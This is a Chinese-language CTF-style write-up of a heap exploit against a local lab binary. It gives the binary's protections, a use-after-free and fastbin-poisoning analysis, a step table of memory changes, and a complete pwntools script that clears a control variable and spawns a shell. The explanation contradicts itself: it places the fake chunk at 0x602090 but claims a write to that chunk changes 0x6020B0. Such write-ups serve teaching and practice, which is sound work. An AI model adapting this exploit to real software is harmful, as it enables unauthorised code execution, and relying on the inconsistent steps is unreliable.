# 漏洞利用文档

## 执行环境
基于提供的漏洞利用脚本和调试记录，分析程序的运行环境如下：
- **二进制文件类型**：64位ELF可执行文件（通过`file`命令确认：`ELF 64-bit LSB executable, x86-64`）。
- **保护机制**（通过`checksec`分析）：
  - **Architecture**：amd64-64-little
  - **RELRO**：Partial RELRO（GOT可写）
  - **Stack**：No canary found（无栈保护）
  - **NX**：NX enabled（堆栈不可执行）
  - **PIE**：No PIE（代码段地址固定）
- **依赖库**（通过`ldd`确认）：依赖libc（如`libc.so.6`），动态链接。
- **运行需求**：程序在Linux环境下运行，需要标准输入/输出。调试记录显示程序使用`/bin/dash`作为shell，因此系统需安装dash或兼容shell。

## 漏洞成因
程序存在多个内存破坏型漏洞，主要源于堆管理中的安全检查缺失：
- **关键结构体**：程序未显式定义结构体，但使用全局变量管理堆内存：
  - `buf`（地址`0x6020C0`）：`void*`数组，存储4个堆块指针（索引0-3）。
  - `dword_6020BC`（地址`0x6020BC`）：`int`类型，记录当前分配块数（最大4）。
  - `qword_6020B0`（地址`0x6020B0`）：`unsigned __int64`类型，控制变量，值为0时触发shell。
- **漏洞类型**：
  - **Use-After-Free (UAF)**：在`sub_4009D7`（释放函数）中释放内存后，未将`buf`数组中的指针置为`NULL`，导致`sub_400A4D`（写入函数）可向已释放内存写入数据。
  - **双重释放**：释放函数未检查索引是否已释放，允许同一内存块被多次释放。
  - **索引越界**：用户输入索引未验证范围（0-3），可能越界访问`buf`数组。
- **漏洞触发**：通过UAF修改已释放堆块的fd指针，操纵fastbin链，实现在全局变量地址分配伪造堆块，最终修改`qword_6020B0`触发shell。

## 漏洞利用过程
利用过程通过UAF和fastbin攻击实现任意地址写入，关键步骤及内存变化如下表所示：

| 步骤 | 操作 | 内存关键变化 | 目的 |
|------|------|---------------|------|
| Step 1 | `add(0x40); add(0x20); delete(0)` | - `buf[0]`指向已释放块`0x39e92010`<br>- fastbins的0x50桶包含块`0x39e92000`（fd=0） | 创建UAF条件：释放块0，但指针未清除 |
| Step 2 | `edit(0, p64(0x602080))` | - 修改块`0x39e92000`的fd指针为`0x602080`<br>- fastbins链变为`0x39e92000 → 0x602080` | 设置fastbin攻击：指向全局数据区地址 |
| Step 3 | `add(0x40); add(0x40)` | - `buf[2]`分配为`0x39e92010`（原块）<br>- `buf[3]`分配为`0x602090`（伪造堆块）<br>- `dword_6020BC`增至4 | 分配伪造堆块：在`qword_6020B0`地址处获得写入能力 |
| Step 4 | `edit(3, p64(0))` | - 修改`qword_6020B0`（`0x6020B0`）从1变为0 | 满足shell触发条件：控制变量被清零 |
| Step 5 | `backdoor()` | - 执行`system("/bin/sh")`<br>- 进程切换至`/bin/dash` | 获取shell权限：程序控制流被劫持 |
| Step 6 | `p.interactive()` | - 进入交互模式，shell进程完全接管 | 完成利用：用户可执行任意命令 |

**内存变化总结**：
- **堆状态**：初始堆块通过UAF被操纵，fastbin链被重定向至全局数据区，最终在`0x6020B0`分配伪造堆块。
- **全局变量**：`qword_6020B0`从1修改为0，触发shell；`dword_6020BC`从2增至4，反映分配计数。
- **进程切换**：成功从原始程序切换到`/bin/dash`，地址空间被完全替换，原始程序内存不可访问。

## Exploit
以下是漏洞利用脚本（exp），在关键位置添加注释说明：

```python
from pwn import *

# 设置调试环境和日志级别
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample14')  # 启动目标程序
elf = ELF('./data/sample14')    # 加载ELF文件
libc = elf.libc                 # 获取libc引用

# 定义功能函数，封装程序操作
def add(size):
    p.recvuntil(b'choice>\n')
    p.sendline(b'1')           # 选择分配内存选项
    p.recvuntil(b'size>\n')
    p.sendline(str(size))      # 指定分配大小

def delete(index):
    p.recvuntil(b'choice>\n')
    p.sendline(b'2')           # 选择释放内存选项
    p.recvuntil(b'index>\n')
    p.sendline(str(index))     # 指定释放索引

def edit(index, content):
    p.recvuntil(b'choice>\n')
    p.sendline(b'3')           # 选择写入内存选项
    p.recvuntil(b'index>\n')
    p.sendline(str(index))     # 指定写入索引
    p.send(content)            # 写入8字节数据

def backdoor():
    p.recvuntil(b'choice>\n')
    p.sendline(b'4')           # 触发后门检查

# 漏洞利用步骤
add(0x40); add(0x20); delete(0)  # Step 1: 分配两个块并释放块0，创建UAF条件
edit(0, p64(0x602080))           # Step 2: 通过UAF修改fd指针，指向全局数据区地址
add(0x40); add(0x40)             # Step 3: 分配两个块，第二个块在伪造地址分配
edit(3, p64(0))                  # Step 4: 通过伪造堆块写入，将控制变量修改为0
backdoor()                       # Step 5: 触发后门，启动shell
p.interactive()                  # Step 6: 进入交互模式，获取shell控制权
```

**注释说明**：
- **Step 1**：利用UAF漏洞，释放块0后保留指针，为后续写入做准备。
- **Step 2**：覆盖已释放堆块的fd指针，指向全局变量地址`0x602080`，设置fastbin攻击链。
- **Step 3**：通过两次分配，第二次分配从fastbin链获取伪造堆块，地址为`0x602090`（靠近控制变量）。
- **Step 4**：使用伪造堆块写入权限，将`qword_6020B0`修改为0，满足shell触发条件。
- **Step 5-6**：调用后门函数启动shell，并进入交互模式完成利用。

此exp成功结合UAF和fastbin攻击，实现了任意地址写入和shell获取。
